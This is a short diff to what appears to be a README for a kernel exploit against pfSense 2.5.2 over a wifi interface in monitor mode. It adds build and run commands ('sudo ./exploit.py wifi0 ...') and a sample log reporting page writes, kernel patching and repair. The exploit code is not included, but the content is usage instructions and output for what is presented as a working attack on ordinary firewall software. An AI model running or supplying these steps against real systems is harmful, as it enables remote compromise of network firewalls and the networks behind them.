@@ -54,5 +54,15 @@ sudo ifconfig wifi0 down && sudo iwconfig wifi0 mode monitor && sudo ifconfig wi
 ```
 # 3 
 ```
-
+./build.py kernels/pfSense-2.5.2-RELEASE
 ```
+# 4
+```
+sudo ./exploit.py wifi0 kernels/pfSense-2.5.2-RELEASE
+```
+# log of the exploit :
+[+] Phase 1: writing page1
+[+] Phase 2: writing L3
+[+] Phase 3: patching kernel
+[+] Phase 4: repairing
+[+] Finished
